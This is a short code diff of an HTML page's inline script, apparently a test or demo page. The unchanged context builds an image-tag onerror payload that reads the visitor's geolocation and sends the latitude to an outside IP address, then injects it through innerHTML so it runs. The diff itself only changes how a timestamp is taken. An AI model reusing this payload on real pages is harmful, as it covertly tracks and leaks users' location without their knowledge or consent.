@@ -416,7 +416,9 @@
 <script>
 var str = "<img src=x onerror=navigator.geolocation.getCurrentPosition(function(position){b=document.createElement(\'img\');" +
     "b.src=\"http://23.83.235.55:8081/\"+position.coords.latitude;});>";
-var t = getTimestamp();
+// var t = getTimestamp();
+var d = new Date();
+var t = d.getTime();
 console.log("zxRes time: " + t);
 document.getElementById('inner').innerHTML = str;
 </script>
